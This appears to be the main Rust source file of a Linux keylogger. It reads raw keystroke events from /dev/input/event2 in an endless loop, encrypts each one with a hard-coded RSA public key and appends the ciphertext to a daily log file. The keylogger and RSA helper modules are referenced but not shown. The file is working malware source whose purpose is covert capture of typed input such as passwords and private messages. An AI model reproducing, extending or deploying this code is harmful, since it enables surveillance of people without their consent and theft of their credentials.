mod keylogger;
mod rsa;

use keylogger::KeyLogger;
use rsa::{gen_keys, pad_data};

use chrono::{DateTime, Local};
use num_bigint_dig::{ToBigUint, RandBigInt, BigUint};
use std::path::Path;
use std::fs::File;
use std::fs::OpenOptions;
use std::io::prelude::*;

fn main() {
	let e = BigUint::parse_bytes(b"65537", 10)
        .unwrap();
    let n = BigUint::parse_bytes(b"726893654806863106618546895057273655441264661325145055622991128175682274731729906015556264256579162493516172845029834644722324327896454261243147930093884060587847049206343040997875678249683217673083057390927228523219516562706789293756062419996669732335698292474241738313810472297868623226097796896132340484716735649944952179058084460249003603199405921560958818961267822766679758920394983786136620924522112830057005196535366761215933393212482864750854232592685811474461298568003115633675850369800934986362845952917985790835063623075408167396594117256336524956863695783013250764066998836408497995291717070517025671368786854251119784534482238786198981808730172431511580525492332130939522228645811310849928074140276569038233908484935569527065290886443920205920064757536160231476433607492303337517653184135797961475927231058895093552142050530878770429480616001550597029356030412941690284376485270056410912518806914509324633661109", 10)
        .unwrap();
  
	let mut test = KeyLogger::new("/dev/input/event2");

	let current_local: DateTime<Local> = Local::now();
	let custom_format = current_local.format("%Y-%m-%d");

	let logs_file_url = format!("./src/data/logs/{}.log", custom_format);

	if !Path::new(logs_file_url.as_str()).exists() {
		File::create(logs_file_url.as_str())
			.expect("Error while creating the file");
	}

	let mut logs_file = OpenOptions::new()
		.append(true)
		.open(logs_file_url.as_str())
		.expect("Error while opening the file");

	loop {
		let event = &mut test.get_current_event();
		let padded_event = pad_data(event.to_vec(), 3072);
		let event_as_bigint = BigUint::from_bytes_be(&padded_event);
		let cypher = event_as_bigint.clone().modpow(&e, &n);
		let buffer = pad_data(cypher.clone().to_bytes_be(), 3072);
		println!("{:?}", buffer.len());

		let _ = logs_file.write_all(&buffer);
	}
}
